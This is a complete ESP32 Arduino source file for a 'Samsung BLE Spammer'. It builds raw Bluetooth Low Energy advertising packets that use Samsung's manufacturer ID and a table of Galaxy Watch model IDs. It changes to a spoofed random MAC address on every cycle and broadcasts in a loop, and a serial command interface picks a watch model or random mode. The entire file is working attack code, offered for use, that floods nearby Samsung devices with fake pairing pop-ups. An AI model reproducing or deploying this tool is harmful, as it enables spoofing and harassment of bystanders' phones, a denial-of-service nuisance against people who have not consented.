/*
 * ESP32-Samsung-BLE-Spammer
 * A tool that spams samsung BLE devices.
 * Author - WireBits
 */

#include <esp_bt.h>
#include <Arduino.h>
#include <BLEUtils.h>
#include <BLEDevice.h>
#include <esp_bt_main.h>
#include <esp_gap_ble_api.h>

#define DEVICE_NAME "ESP32-Samsung-BLE-Spammer"

static const char *TAG = "ESP32-Samsung-BLE-Spammer";

const uint8_t PREPENDED_BYTES[] = {0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43};

const char* watch_names[] = {
  "Fallback Watch", "White Watch4 Classic 44mm", "Black Watch4 Classic 40mm", "White Watch4 Classic 40mm", "Black Watch4 44mm",
  "Silver Watch4 44mm", "Green Watch4 44mm", "Black Watch4 40mm (alt)", "White Watch4 40mm (alt)", "Gold Watch4 40mm",
  "French Watch4", "French Watch4 Classic", "Fox Watch5 44mm", "Black Watch5 44mm", "Sapphire Watch5 44mm",
  "Purpleish Watch5 40mm", "Gold Watch5 40mm", "Black Watch5 Pro 45mm", "Gray Watch5 Pro 45mm", "White Watch5 44mm",
  "White & Black Watch5", "Black Watch6 Pink 40mm", "Gold Watch6 Gold 40mm", "Silver Watch6 Cyan 44mm", "Black Watch6 Classic 43mm",
  "Green Watch6 Classic 43mm"
};

const uint8_t watch_ids[] = {
  0x1A,0x01,0x02,0x03,0x04,
  0x05,0x06,0x07,0x08,0x09,
  0x0A,0x0B,0x0C,0x11,0x12,
  0x13,0x14,0x15,0x16,0x17,
  0x18,0x1B,0x1C,0x1D,0x1E,
  0x20
};

const uint16_t MANUFACTURER_ID = 0x0075;

static esp_ble_adv_params_t adv_params = {
  .adv_int_min = 160, .adv_int_max = 160, .adv_type = ADV_TYPE_NONCONN_IND,
  .own_addr_type = BLE_ADDR_TYPE_RANDOM, .peer_addr = {0}, .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
  .channel_map = ADV_CHNL_ALL, .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY
};

BLEServer *pServer;

bool spamming = false;
bool randomMode = false;
int currentIndex = 0;

const int DEVICE_COUNT = sizeof(watch_ids) / sizeof(watch_ids[0]);

uint8_t* build_adv_packet(uint16_t man_id, uint8_t watch_id, size_t* out_len) {
  size_t man_len = 2 + sizeof(PREPENDED_BYTES) + 1;
  uint8_t* man_data = (uint8_t*)malloc(man_len);
  if (!man_data) return nullptr;
  man_data[0] = man_id & 0xFF;
  man_data[1] = man_id >> 8;
  memcpy(man_data + 2, PREPENDED_BYTES, sizeof(PREPENDED_BYTES));
  man_data[2 + sizeof(PREPENDED_BYTES)] = watch_id;
  const uint8_t flags[] = {0x02,0x01,0x06};
  size_t total_len = sizeof(flags) + 2 + man_len;
  uint8_t* adv = (uint8_t*)malloc(total_len);
  if (!adv) { free(man_data); return nullptr; }
  size_t idx = 0;
  memcpy(adv + idx, flags, sizeof(flags)); idx += sizeof(flags);
  adv[idx++] = man_len + 1;
  adv[idx++] = 0xFF;
  memcpy(adv + idx, man_data, man_len); idx += man_len;
  free(man_data);
  *out_len = idx;
  return adv;
}

void generate_random_static_addr(uint8_t addr[6]) {
  for (int i = 0; i < 6; i++) addr[i] = esp_random() & 0xFF;
  addr[5] = (addr[5] & 0x3F) | 0xC0;
}

void start_advertising_raw(uint8_t* adv, size_t len) {
  if (esp_ble_gap_config_adv_data_raw(adv, len) == ESP_OK &&
      esp_ble_gap_start_advertising(&adv_params) == ESP_OK) {
  }
}

void stop_advertising_raw() {
  if (esp_ble_gap_stop_advertising() == ESP_OK) ESP_LOGI(TAG, "Stopped advertising (raw)");
}

void printHelp() {
  Serial.println(F("Available commands:"));
  Serial.println(F("  list                - List all devices for spamming"));
  Serial.println(F("  start <INDEX>       - Spam device of particular index (INDEX = 1 to 26)"));
  Serial.println(F("  start random        - Spam device randomly"));
  Serial.println(F("  stop                - Stop spam"));
  Serial.println(F("  help                - Show this help message"));
}

void printList() {
  Serial.println(F("Device list:"));
  for (int i = 0; i < DEVICE_COUNT; ++i) {
    Serial.print(i + 1);
    Serial.print(" : ");
    Serial.println(watch_names[i]);
  }
}

void handleSerialCommands() {
  if (!Serial.available()) return;
  String line = Serial.readStringUntil('\n');
  line.trim();
  if (line.length() == 0) return;
  String low = line;
  low.toLowerCase();
  if (low == "list") {
    printList();
    return;
  }
  if (low == "help") {
    printHelp();
    return;
  }
  if (low == "stop") {
    if (spamming) {
      spamming = false;
      stop_advertising_raw();
      Serial.println("[!] Spamming Stopped!");
    } else {
      Serial.println("[!] Already Stopped!");
    }
    return;
  }
  if (low.startsWith("start")) {
    String arg = line.substring(5);
    arg.trim();
    arg.toLowerCase();
    if (arg.length() == 0) {
      Serial.println("Usage: start <INDEX>  or start random");
      return;
    }
    if (arg == "random") {
      randomMode = true;
      spamming = true;
      return;
    }
    bool ok = true;
    for (size_t i = 0; i < arg.length(); ++i) {
      if (!isDigit(arg[i])) { ok = false; break; }
    }
    if (!ok) {
      Serial.println("[!] Invalid argument for start. Use a number (1..26) or 'random'!");
      return;
    }
    int idx = arg.toInt();
    if (idx < 1 || idx > DEVICE_COUNT) {
      Serial.print("Index out of range. Enter 1..");
      Serial.println(DEVICE_COUNT);
      return;
    }
    randomMode = false;
    currentIndex = idx - 1;
    spamming = true;
    Serial.println("--------------------------------------------------------------------------------");
    return;
  }
  Serial.println("[!] Unknown command! Type 'help' for commands.");
}

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println();
  Serial.println("Initializing ESP32-Samsung-BLE-Spammer...");
  Serial.println("Type 'help' for available commands.");
  BLEDevice::init(DEVICE_NAME);
  pServer = BLEDevice::createServer();
  randomSeed((uint32_t)esp_random());
}

void loop() {
  handleSerialCommands();
  if (!spamming) {
    delay(50);
    return;
  }
  int idx = currentIndex;
  if (randomMode) {
    idx = random(0, DEVICE_COUNT);
    currentIndex = idx;
  }
  Serial.print("Spamming ");
  Serial.println(watch_names[idx]);
  uint8_t addr[6];
  generate_random_static_addr(addr);
  Serial.print("Spoofed Random Static Address : ");
  for (int i = 5; i >= 0; --i) {
    if (addr[i] < 16) Serial.print("0");
    Serial.print(addr[i], HEX);
    if (i) Serial.print(":");
  }
  Serial.println();
  esp_ble_gap_set_rand_addr(addr);
  delay(10);
  const char* name = watch_names[idx];
  esp_ble_gap_set_device_name(name);
  uint8_t watch_id = watch_ids[idx];
  size_t adv_len;
  uint8_t* adv = build_adv_packet(MANUFACTURER_ID, watch_id, &adv_len);
  if (!adv) {
    delay(1000);
    return;
  }
  Serial.print("Advertising Packet (Raw) : ");
  for (size_t i = 0; i < adv_len; i++) {
    if (adv[i] < 16) Serial.print("0");
    Serial.print(adv[i], HEX);
    Serial.print(" ");
  }
  Serial.println();
  Serial.println("--------------------------------------------------------------------------------");
  start_advertising_raw(adv, adv_len);
  delay(1000);
  stop_advertising_raw();
  free(adv);
  delay(10);
}
